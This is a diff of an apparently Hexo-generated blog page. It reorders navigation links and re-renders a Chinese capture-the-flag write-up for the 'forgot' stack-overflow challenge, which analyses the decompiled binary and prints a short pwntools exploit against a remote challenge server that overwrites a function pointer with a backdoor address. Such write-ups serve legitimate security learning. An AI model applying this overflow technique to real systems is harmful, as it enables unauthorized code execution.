@@ -258,9 +258,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/categories/">
               
-              归档
+              分类
               
               
             </a>
@@ -269,9 +269,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/archive/">
               
-              分类
+              归档
               
               
             </a>
@@ -410,7 +410,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">343</span> In Total
+              Words <span class="post-count">338</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -472,24 +472,9 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h2 id="checksec">checksec</h2>
-<p><img src="forgot_2.png" alt=""><br>
-一道正常的栈题，只开了NX</p>
-<h2 id="反编译">反编译</h2>
-<p><img src="forgot_3.png" alt=""><br>
-第一次fgets输入长度为32，后面有一次scanf输入v2，结合栈的排布可以发现输入v2的时候可以溢出覆盖s，那么我们只需要控制好第二次输入就可以了<br>
-shift+f12看到有cat flag的字符串，找到对应函数:<br>
-<img src="forgot_5.png" alt=""><br>
-<img src="forgot_4.png" alt=""><br>
-程序最后对&quot;v3[–v5]&quot;的地址会直接调用，而前面的程序就是通过判断v2[i]的值是否在小写字母范围内对v5进行累加（在v5&gt;=5的情况下），最大到10.<br>
-那么我们需要做的就是通过覆盖v3[9]的地址为后门函数<br>
-然后需要做的是覆盖v5的初值为5及以上，然后让程序自带的循环将其加至10<br>
-需要注意的是不能一开始直接覆盖成0x9或者0xA，因为scanf读入%s的时候输入16进制数会解析成对应的ascii值<br>
-<img src="forgot_6.png" alt=""><br>
-而scanf读到0x9和0xA对应的ascii码值就停了，前面的不会，所以不能是直接覆盖成0x9或0xA<br>
-小细节，也算是学到东西</p>
-<h2 id="exp">exp</h2>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./for_got&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="string">&quot;50072&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;l0tus&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x44</span>+p32(<span class="number">0x80486CC</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        <h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="forgot_2.png" alt=""><br>一道正常的栈题，只开了NX</p>
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p><img src="forgot_3.png" alt=""><br>第一次fgets输入长度为32，后面有一次scanf输入v2，结合栈的排布可以发现输入v2的时候可以溢出覆盖s，那么我们只需要控制好第二次输入就可以了<br>shift+f12看到有cat flag的字符串，找到对应函数:<br><img src="forgot_5.png" alt=""><br><img src="forgot_4.png" alt=""><br>程序最后对”v3[—v5]”的地址会直接调用，而前面的程序就是通过判断v2[i]的值是否在小写字母范围内对v5进行累加（在v5&gt;=5的情况下），最大到10.<br>那么我们需要做的就是通过覆盖v3[9]的地址为后门函数<br>然后需要做的是覆盖v5的初值为5及以上，然后让程序自带的循环将其加至10<br>需要注意的是不能一开始直接覆盖成0x9或者0xA，因为scanf读入%s的时候输入16进制数会解析成对应的ascii值<br><img src="forgot_6.png" alt=""><br>而scanf读到0x9和0xA对应的ascii码值就停了，前面的不会，所以不能是直接覆盖成0x9或0xA<br>小细节，也算是学到东西</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&quot;./for_got&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="string">&quot;50072&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;l0tus&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x44</span>+p32(<span class="number">0x80486CC</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(<span class="number">0x8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
         <hr>
